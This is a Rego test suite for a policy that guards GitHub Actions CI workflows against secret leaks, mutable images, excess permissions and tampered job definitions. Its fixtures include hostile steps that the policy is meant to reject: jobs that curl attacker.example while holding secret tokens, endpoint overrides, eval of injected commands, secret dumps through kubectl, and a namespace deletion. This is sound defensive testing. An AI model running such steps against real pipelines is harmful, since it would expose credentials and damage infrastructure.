package main

import rego.v1

test_rejects_mutable_docker_action_image if {
	violations := deny with input as workflow_with_images(
		"docker://alpine:3.21",
		"ghcr.io/example/job@sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
		"ghcr.io/example/service@sha256:bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
	)
	some msg in violations
	contains(msg, "Docker action image")
}

test_rejects_mutable_job_container_image if {
	violations := deny with input as workflow_with_images(
		"docker://alpine@sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
		{"image": "ghcr.io/example/job:latest"},
		"ghcr.io/example/service@sha256:bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
	)
	some msg in violations
	contains(msg, "container image")
}

test_rejects_mutable_service_image if {
	violations := deny with input as workflow_with_images(
		"docker://alpine@sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
		"ghcr.io/example/job@sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
		"ghcr.io/example/service:latest",
	)
	some msg in violations
	contains(msg, "service")
}

test_allows_digest_pinned_workflow_images if {
	violations := deny with input as workflow_with_images(
		"docker://alpine@sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
		"ghcr.io/example/job@sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
		"ghcr.io/example/service@sha256:bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
	)
	count(violations) == 0
}

test_rejects_public_live_command_output if {
	violations := deny with input as workflow_with_live_run("bash scripts/ci/install-kubeconfig.sh")
	some msg in violations
	contains(msg, "withhold sensitive command output")
}

test_rejects_dot_slash_live_command_output if {
	violations := deny with input as workflow_with_live_run("./scripts/ci/install-kubeconfig.sh")
	some msg in violations
	contains(msg, "withhold sensitive command output")
}

test_rejects_direct_kubectl_output if {
	violations := deny with input as workflow_with_live_run("kubectl get secrets --all-namespaces -o yaml")
	some msg in violations
	contains(msg, "withhold sensitive command output")
}

test_rejects_direct_aws_output if {
	violations := deny with input as workflow_with_live_run("aws ssm get-parameter --with-decryption --name example")
	some msg in violations
	contains(msg, "withhold sensitive command output")
}

test_rejects_direct_octeliumctl_output if {
	violations := deny with input as workflow_with_live_run("octeliumctl get services -o json")
	some msg in violations
	contains(msg, "withhold sensitive command output")
}

test_rejects_direct_terragrunt_state_output if {
	violations := deny with input as workflow_with_live_run("terragrunt output -json")
	some msg in violations
	contains(msg, "withhold sensitive command output")
}

test_rejects_direct_tofu_state_output if {
	violations := deny with input as workflow_with_live_run("tofu show -json plan.out")
	some msg in violations
	contains(msg, "withhold sensitive command output")
}

test_rejects_quoted_terragrunt_state_output if {
	violations := deny with input as workflow_with_live_run(`"terragrunt" output -json`)
	some msg in violations
	contains(msg, "withhold sensitive command output")
}

test_rejects_dynamic_executable if {
	violations := deny with input as workflow_with_live_run(`${TG:-tofu} show -json plan.out`)
	some msg in violations
	contains(msg, "withhold sensitive command output")
}

test_rejects_nix_wrapped_dynamic_executable if {
	violations := deny with input as workflow_with_live_run(`nix develop --command "$TG" show -json plan.out`)
	some msg in violations
	contains(msg, "withhold sensitive command output")
}

test_rejects_workflow_scoped_secret_env if {
	violations := deny with input as {
		"name": "unsafe root env",
		"on": "push",
		"permissions": {},
		"env": {"TOKEN": "${{secrets.OCTELIUM_CI_AUTH_TOKEN}}"},
		"jobs": {"test": {
			"runs-on": "ubuntu-24.04",
			"permissions": {},
			"steps": [{"run": "true"}],
		}},
	}
	some msg in violations
	contains(msg, "workflow-level environment variable")
}

test_rejects_job_scoped_github_token_env if {
	violations := deny with input as {
		"name": "unsafe job env",
		"on": "push",
		"permissions": {},
		"jobs": {"test": {
			"runs-on": "ubuntu-24.04",
			"permissions": {},
			"env": {"TOKEN": "${{github.token}}"},
			"steps": [{"run": "true"}],
		}},
	}
	some msg in violations
	contains(msg, "workflow job")
}

test_rejects_mixed_case_workflow_scoped_secret_env if {
	violations := deny with input as {
		"name": "unsafe mixed-case root env",
		"on": "push",
		"permissions": {},
		"env": {"TOKEN": "${{ SECRETS [ 'NAME' ] }}"},
		"jobs": {"test": {
			"runs-on": "ubuntu-24.04",
			"permissions": {},
			"steps": [{"run": "true"}],
		}},
	}
	some msg in violations
	contains(msg, "workflow-level environment variable")
}

test_rejects_mixed_case_job_scoped_github_token_env if {
	violations := deny with input as {
		"name": "unsafe mixed-case job env",
		"on": "push",
		"permissions": {},
		"jobs": {"test": {
			"runs-on": "ubuntu-24.04",
			"permissions": {},
			"env": {"TOKEN": "${{ GITHUB [ 'token' ] }}"},
			"steps": [{"run": "true"}],
		}},
	}
	some msg in violations
	contains(msg, "workflow job")
}

test_rejects_serialized_github_context_in_job_env if {
	violations := deny with input as {
		"name": "unsafe serialized github context",
		"on": "push",
		"permissions": {},
		"jobs": {"test": {
			"runs-on": "ubuntu-24.04",
			"permissions": {},
			"env": {"CONTEXT": "${{ toJSON(GITHUB.*) }}"},
			"steps": [{"run": "true"}],
		}},
	}
	some msg in violations
	contains(msg, "workflow job")
}

test_rejects_joined_github_context_in_job_env if {
	violations := deny with input as {
		"name": "unsafe joined github context",
		"on": "push",
		"permissions": {},
		"jobs": {"test": {
			"runs-on": "ubuntu-24.04",
			"permissions": {},
			"env": {"CONTEXT": "${{ join(GITHUB.*, ',') }}"},
			"steps": [{"run": "true"}],
		}},
	}
	some msg in violations
	contains(msg, "workflow job")
}

test_rejects_credentials_after_expression_braces if {
	every value in [
		"${{ format('}}{0}', github.token) }}",
		"${{ format('}}{0}', secrets.NAME) }}",
	] {
		violations := deny with input as {
			"name": "unsafe embedded braces",
			"on": "push",
			"permissions": {},
			"env": {"TOKEN": value},
			"jobs": {"test": {
				"runs-on": "ubuntu-24.04",
				"permissions": {},
				"steps": [{"run": "true"}],
			}},
		}
		some msg in violations
		contains(msg, "workflow-level environment variable")
	}
}

test_allows_unrelated_variable_name_containing_github if {
	violations := deny with input as {
		"name": "safe variable name",
		"on": "push",
		"permissions": {},
		"env": {"REPOSITORY": "${{ vars.MY_GITHUB }}"},
		"jobs": {"test": {
			"runs-on": "ubuntu-24.04",
			"permissions": {},
			"steps": [{"run": "true"}],
		}},
	}
	count(violations) == 0
}

test_allows_local_terragrunt_validation if {
	violations := deny with input as workflow_with_live_run("nix develop --command terragrunt hcl validate")
	count(violations) == 0
}

test_allows_local_helm_render if {
	violations := deny with input as workflow_with_live_run("helm template example ./chart >/dev/null")
	count(violations) == 0
}

test_allows_local_kustomize_output if {
	violations := deny with input as workflow_with_live_run("kubectl kustomize clusters/homelab/apps/example >/dev/null")
	count(violations) == 0
}

test_rejects_comment_only_privacy_markers if {
	violations := deny with input as workflow_with_live_run(`# umask 077
# trap 'rm -f "$private_log"' EXIT
# >"$private_log" 2>&1
# echo "details withheld"
bash scripts/ci/install-kubeconfig.sh`)
	some msg in violations
	contains(msg, "withhold sensitive command output")
}

test_rejects_unrelated_private_redirection if {
	violations := deny with input as workflow_with_live_run(`private_log="$(mktemp)"
trap 'rm -f "$private_log"' EXIT
umask 077
echo dummy >"$private_log" 2>&1
bash scripts/ci/install-kubeconfig.sh
echo "details withheld"`)
	some msg in violations
	contains(msg, "withhold sensitive command output")
}

test_rejects_private_log_reprint if {
	run := sprintf("%s\ncat \"$private_log\"", [withheld_live_run])
	violations := deny with input as workflow_with_live_run(run)
	some msg in violations
	contains(msg, "withhold sensitive command output")
}

test_rejects_wrapped_live_command_and_write_all if {
	base := workflow_with_live_run("nix develop --command bash scripts/ci/install-kubeconfig.sh")
	workflow := object.union(base, {"jobs": {"test": object.union(base.jobs.test, {
		"permissions": "write-all",
		"steps": array.concat(base.jobs.test.steps, [{"uses": "actions/upload-artifact@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"}]),
	})}})
	violations := deny with input as workflow
	some msg in violations
	contains(msg, "withhold sensitive command output")
	some permission_msg in violations
	contains(permission_msg, "write-all")
	some artifact_msg in violations
	contains(artifact_msg, "must not upload artifacts")
}

test_rejects_live_job_public_write_permission if {
	base := workflow_with_live_run(withheld_live_run)
	workflow := object.union(base, {"jobs": {"test": object.union(base.jobs.test, {"permissions": {"pull-requests": "write", "id-token": "write"}})}})
	violations := deny with input as workflow
	some msg in violations
	contains(msg, "pull-requests")
}

test_rejects_workflow_wide_write_permission if {
	workflow := object.union(workflow_with_live_run("echo safe"), {"permissions": {"pull-requests": "write"}})
	violations := deny with input as workflow
	some msg in violations
	contains(msg, "workflow-wide")
}

test_rejects_live_job_artifact_upload if {
	base := workflow_with_live_run(withheld_live_run)
	workflow := object.union(base, {"jobs": {"test": object.union(base.jobs.test, {"steps": array.concat(base.jobs.test.steps, [{"uses": "actions/upload-artifact@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"}])})}})
	violations := deny with input as workflow
	some msg in violations
	contains(msg, "must not upload artifacts")
}

test_allows_withheld_live_command_output if {
	sensitive_command_run(withheld_live_run)
	private_live_output(withheld_live_run)
}

test_rejects_octelium_catalog_without_one_use_credential if {
	violations := deny with input as workflow_with_catalog_run({})
	some msg in violations
	contains(msg, "must use its one-use catalog credential")
}

test_allows_one_use_octelium_catalog_with_private_output if {
	violations := deny with input as workflow_with_catalog_run({"OCTELIUM_CATALOG_AUTH_TOKEN": "test"})
	count(violations) == 0
}

test_rejects_octelium_catalog_credential_on_different_step if {
	violations := deny with input as workflow_with_catalog_credential_on_different_step
	some msg in violations
	contains(msg, "must use its one-use catalog credential")
}

withheld_live_run := `private_log="$(mktemp)"
trap 'rm -f "$private_log"' EXIT
if ! nix develop --command bash >"$private_log" 2>&1 <<'EOF'
set -euo pipefail
umask 077
bash scripts/ci/install-kubeconfig.sh
EOF
then
  echo "failure details withheld"
  exit 1
fi
echo "success details withheld"`

withheld_catalog_run := `private_log="$(mktemp)"
trap 'rm -f "$private_log"' EXIT
if ! nix develop --command bash >"$private_log" 2>&1 <<'EOF'
umask 077
bash scripts/ci/octelium-private-kubernetes-apply.sh
EOF
then
  echo "failure details withheld"
  exit 1
fi
echo "success details withheld"`

workflow_with_images(docker_action, job_container, service_image) := {
	"name": "Container pinning test",
	"on": "push",
	"jobs": {"test": {
		"runs-on": "ubuntu-latest",
		"container": job_container,
		"services": {"database": {"image": service_image}},
		"steps": [{"uses": docker_action}],
	}},
}

workflow_with_live_run(run) := {
	"name": "Live output test",
	"on": "workflow_dispatch",
	"jobs": {"test": {
		"runs-on": "ubuntu-latest",
		"steps": [{"run": run, "env": {"OCTELIUM_AUTH_TOKEN": "test"}}],
	}},
}

workflow_with_catalog_run(env) := {
	"name": "Octelium catalog test",
	"on": "workflow_dispatch",
	"permissions": {},
	"jobs": {"test": {
		"runs-on": "ubuntu-latest",
		"permissions": {"contents": "read"},
		"steps": [{"run": withheld_catalog_run, "env": env}],
	}},
}

workflow_with_catalog_credential_on_different_step := {
	"name": "Octelium catalog test",
	"on": "workflow_dispatch",
	"permissions": {},
	"jobs": {"test": {
		"runs-on": "ubuntu-latest",
		"permissions": {"contents": "read"},
		"steps": [
			{"run": withheld_catalog_run},
			{"run": "true", "env": {"OCTELIUM_CATALOG_AUTH_TOKEN": "test"}},
		],
	}},
}

test_allows_exact_plan_contract if {
	input_workflow := plan_workflow(plan_job)
	hash := protected_job_contract_hash(plan_job) with input as input_workflow
	violations := deny with input as input_workflow with data.main.protected_job_hashes as {"homelab-plan/terragrunt-plan": hash}
	count(violations) == 0
}

test_rejects_secret_expression_in_step_name if {
	baseline := plan_workflow(plan_job)
	hash := protected_job_contract_hash(plan_job) with input as baseline
	mutated_preflight := object.union(plan_preflight_step, {"name": "${{ contains(secrets.OCTELIUM_CI_AUTH_TOKEN, 'guess') }}"})
	mutated_job := object.union(plan_job, {"steps": [mutated_preflight, plan_live_step]})
	violations := deny with input as plan_workflow(mutated_job) with data.main.protected_job_hashes as {"homelab-plan/terragrunt-plan": hash}
	some msg in violations
	contains(msg, "exact structural contract")
}

test_allows_exact_diagnostics_contract if {
	input_workflow := diagnostics_workflow(diagnostics_job)
	hash := protected_job_contract_hash(diagnostics_job) with input as input_workflow
	violations := deny with input as input_workflow with data.main.protected_job_hashes as {"homelab-plan/grafana": hash}
	count(violations) == 0
}

test_allows_exact_shared_environment_contract if {
	input_workflow := shared_environment_workflow(shared_environment_job)
	hash := protected_job_contract_hash(shared_environment_job) with input as input_workflow
	violations := deny with input as input_workflow with data.main.protected_job_hashes as {"homelab-production/reconcile": hash}
	count(violations) == 0
}

test_rejects_precedence_override_with_canonical_workflow_endpoint if {
	mutated_job := object.union(plan_job, {"env": {"KUBE_API_SERVER_URL": "https://attacker.example"}})
	input_workflow := object.union(plan_workflow(mutated_job), {"env": {
		"AWS_REGION": "us-east-1",
		"KUBE_API_SERVER_URL": octelium_endpoint,
	}})
	baseline := plan_workflow(plan_job)
	hash := protected_job_contract_hash(plan_job) with input as baseline
	violations := deny with input as input_workflow with data.main.protected_job_hashes as {"homelab-plan/terragrunt-plan": hash}
	some msg in violations
	contains(msg, "exact structural contract")
}

test_rejects_protected_job_under_different_trigger if {
	baseline := plan_workflow(plan_job)
	input_workflow := object.union(baseline, {"on": {"workflow_dispatch": {}}})
	hash := protected_job_contract_hash(plan_job) with input as baseline
	violations := deny with input as input_workflow with data.main.protected_job_hashes as {"homelab-plan/terragrunt-plan": hash}
	some msg in violations
	contains(msg, "exact structural contract")
}

test_rejects_step_endpoint_override if {
	mutated_preflight := object.union(plan_preflight_step, {"env": {
		"KUBE_API_SERVER_URL": "https://attacker.example",
		"OCTELIUM_AUTH_TOKEN": octelium_token_expression,
	}})
	mutated_job := object.union(plan_job, {"steps": [mutated_preflight, plan_live_step]})
	violations := plan_violations(mutated_job)
	some msg in violations
	contains(msg, "exact effective Octelium endpoint")
}

test_rejects_noncanonical_token_expression if {
	mutated_preflight := object.union(plan_preflight_step, {"env": {
		"KUBE_API_SERVER_URL": octelium_endpoint,
		"OCTELIUM_AUTH_TOKEN": "${{ secrets.ATTACKER_TOKEN }}",
	}})
	mutated_job := object.union(plan_job, {"steps": [mutated_preflight, plan_live_step]})
	violations := plan_violations(mutated_job)
	some msg in violations
	contains(msg, "exact effective Octelium endpoint")
}

test_rejects_workflow_endpoint_inherited_by_live_step if {
	input_workflow := object.union(plan_workflow(plan_job), {"env": {
		"AWS_REGION": "us-east-1",
		"KUBE_API_SERVER_URL": octelium_endpoint,
	}})
	baseline := plan_workflow(plan_job)
	hash := protected_job_contract_hash(plan_job) with input as baseline
	violations := deny with input as input_workflow with data.main.protected_job_hashes as {"homelab-plan/terragrunt-plan": hash}
	some msg in violations
	contains(msg, "exact effective Octelium endpoint")
}

test_rejects_skipped_preflight if {
	mutated_preflight := object.union(plan_preflight_step, {"if": false})
	violations := plan_violations(object.union(plan_job, {"steps": [mutated_preflight, plan_live_step]}))
	some msg in violations
	contains(msg, "exact structural contract")
}

test_rejects_error_tolerant_preflight if {
	mutated_preflight := object.union(plan_preflight_step, {"continue-on-error": true})
	violations := plan_violations(object.union(plan_job, {"steps": [mutated_preflight, plan_live_step]}))
	some msg in violations
	contains(msg, "exact structural contract")
}

test_rejects_always_live_step if {
	mutated_live := object.union(plan_live_step, {"if": "${{ always() }}"})
	violations := plan_violations(object.union(plan_job, {"steps": [plan_preflight_step, mutated_live]}))
	some msg in violations
	contains(msg, "exact structural contract")
}

test_rejects_custom_preflight_shell if {
	mutated_preflight := object.union(plan_preflight_step, {"shell": "bash -c 'exit 0' {0}"})
	violations := plan_violations(object.union(plan_job, {"steps": [mutated_preflight, plan_live_step]}))
	some msg in violations
	contains(msg, "exact structural contract")
}

test_rejects_renamed_workflow_with_eval_live_step if {
	mutated_live := object.union(plan_live_step, {"run": "eval \"$LIVE_COMMAND\""})
	violations := plan_violations(object.union(plan_job, {"steps": [plan_preflight_step, mutated_live]}))
	some msg in violations
	contains(msg, "exact structural contract")
}

test_rejects_extra_live_step if {
	extra := {
		"id": "extra",
		"run": "nix develop --command terragrunt apply -auto-approve",
	}
	mutated_job := object.union(plan_job, {"steps": [plan_preflight_step, plan_live_step, extra]})
	violations := plan_violations(mutated_job)
	some msg in violations
	contains(msg, "exact structural contract")
}

test_rejects_extra_action if {
	extra := {
		"id": "extra",
		"uses": "./.github/actions/live",
	}
	mutated_job := object.union(plan_job, {"steps": [plan_preflight_step, plan_live_step, extra]})
	violations := plan_violations(mutated_job)
	some msg in violations
	contains(msg, "exact structural contract")
}

test_rejects_diagnostics_mutation if {
	mutated_live := object.union(diagnostics_live_step, {"run": "kubectl delete namespace monitoring"})
	mutated_job := object.union(diagnostics_job, {"steps": [diagnostics_preflight_step, mutated_live]})
	violations := diagnostics_violations(mutated_job)
	some msg in violations
	contains(msg, "exact structural contract")
}

test_rejects_shell_concatenated_kubectl if {
	mutated_live := object.union(plan_live_step, {"run": "kube$''ctl get nodes"})
	violations := plan_violations(object.union(plan_job, {"steps": [plan_preflight_step, mutated_live]}))
	some msg in violations
	contains(msg, "exact structural contract")
}

test_rejects_normalized_live_script_path if {
	mutated_live := object.union(plan_live_step, {"run": "bash scripts/ci/./terragrunt-apply.sh"})
	violations := plan_violations(object.union(plan_job, {"steps": [plan_preflight_step, mutated_live]}))
	some msg in violations
	contains(msg, "exact structural contract")
}

test_rejects_unknown_token_bearing_job if {
	input_workflow := {"jobs": {"exfiltrate": {"steps": [{
		"env": {"TOKEN": octelium_token_expression},
		"run": "echo token",
	}]}}}
	violations := deny with input as input_workflow
	some msg in violations
	contains(msg, "exact protected job ID")
}

test_rejects_unknown_protected_environment_job if {
	input_workflow := {"jobs": {"exfiltrate": {
		"environment": {"name": "homelab-production"},
		"steps": [{"run": "echo unreviewed"}],
	}}}
	violations := deny with input as input_workflow
	some msg in violations
	contains(msg, "without an exact structural contract")
}

test_rejects_case_insensitive_environment_and_secret_names if {
	input_workflow := {"jobs": {"exfiltrate": {
		"environment": {"name": "Homelab-Plan"},
		"steps": [{
			"env": {"TOKEN": "${{ secrets.octelium_ci_auth_token }}"},
			"run": "curl https://attacker.example",
		}],
	}}}
	violations := deny with input as input_workflow
	some msg in violations
	contains(msg, "without an exact structural contract")
}

test_rejects_expression_environment_name if {
	input_workflow := {"jobs": {"exfiltrate": {
		"environment": {"name": "${{ format('homelab-{0}', 'plan') }}"},
		"steps": [{
			"env": {"TOKEN": "${{ secrets.octelium_ci_auth_token }}"},
			"run": "curl https://attacker.example",
		}],
	}}}
	violations := deny with input as input_workflow
	some msg in violations
	contains(msg, "literal GitHub environment name")
}

test_rejects_unknown_job_inheriting_workflow_token if {
	input_workflow := {
		"env": {"OCTELIUM_AUTH_TOKEN": octelium_token_expression},
		"jobs": {"exfiltrate": {"steps": [{"run": "eval \"$LIVE_COMMAND\""}]}},
	}
	violations := deny with input as input_workflow
	some msg in violations
	contains(msg, "must remain step-local")
}

plan_violations(mutated_job) := violations if {
	baseline := plan_workflow(plan_job)
	hash := protected_job_contract_hash(plan_job) with input as baseline
	violations := deny with input as plan_workflow(mutated_job) with data.main.protected_job_hashes as {"homelab-plan/terragrunt-plan": hash}
}

diagnostics_violations(mutated_job) := violations if {
	baseline := diagnostics_workflow(diagnostics_job)
	hash := protected_job_contract_hash(diagnostics_job) with input as baseline
	violations := deny with input as diagnostics_workflow(mutated_job) with data.main.protected_job_hashes as {"homelab-plan/grafana": hash}
}

plan_workflow(job) := {
	"env": {"AWS_REGION": "us-east-1"},
	"jobs": {"terragrunt-plan": job},
	"name": "Mutable display name",
	"on": {"pull_request": {}},
}

diagnostics_workflow(job) := {
	"jobs": {"grafana": job},
	"name": "Mutable diagnostics name",
	"on": {"workflow_dispatch": {}},
}

shared_environment_workflow(job) := {
	"jobs": {"reconcile": job},
	"name": "Mutable maintenance name",
	"on": {"workflow_dispatch": {}},
}

plan_job := {
	"environment": {"name": "homelab-plan"},
	"name": "Mutable job name",
	"runs-on": "ubuntu-24.04",
	"steps": [plan_preflight_step, plan_live_step],
}

plan_preflight_step := {
	"env": {
		"KUBE_API_SERVER_URL": octelium_endpoint,
		"OCTELIUM_AUTH_TOKEN": octelium_token_expression,
	},
	"id": "install_kubeconfig",
	"name": "Mutable preflight name",
	"run": withheld_live_run,
}

plan_live_step := {
	"id": "live",
	"name": "Mutable live name",
	"run": withheld_plan_run,
}

diagnostics_job := {
	"environment": {"name": "homelab-plan"},
	"runs-on": "ubuntu-24.04",
	"steps": [diagnostics_preflight_step, diagnostics_live_step],
}

diagnostics_preflight_step := {
	"env": {
		"KUBE_API_SERVER_URL": octelium_endpoint,
		"OCTELIUM_AUTH_TOKEN": octelium_token_expression,
	},
	"id": "install_kubeconfig",
	"run": withheld_live_run,
}

diagnostics_live_step := {
	"id": "live",
	"run": withheld_diagnostics_run,
}

withheld_plan_run := `private_log="$(mktemp)"
trap 'rm -f "$private_log"' EXIT
if ! nix develop --command bash >"$private_log" 2>&1 <<'EOF'
set -euo pipefail
umask 077
bash scripts/ci/terragrunt-plan.sh
EOF
then
  echo "failure details withheld"
  exit 1
fi
echo "success details withheld"`

withheld_diagnostics_run := `private_log="$(mktemp)"
trap 'rm -f "$private_log"' EXIT
if ! nix develop --command bash >"$private_log" 2>&1 <<'EOF'
set -euo pipefail
umask 077
kubectl -n monitoring rollout status deployment/grafana --timeout=120s >/dev/null
EOF
then
  echo "failure details withheld"
  exit 1
fi
echo "success details withheld"`

shared_environment_job := {
	"environment": {"name": "homelab-production"},
	"runs-on": "ubuntu-24.04",
	"steps": [{
		"env": {"CLOUDFLARE_ZONE_SETTINGS_TOKEN": "${{ secrets.CLOUDFLARE_ZONE_SETTINGS_TOKEN }}"},
		"id": "live",
		"run": "scripts/octelium-cloudflare-origin-port.sh",
	}],
}
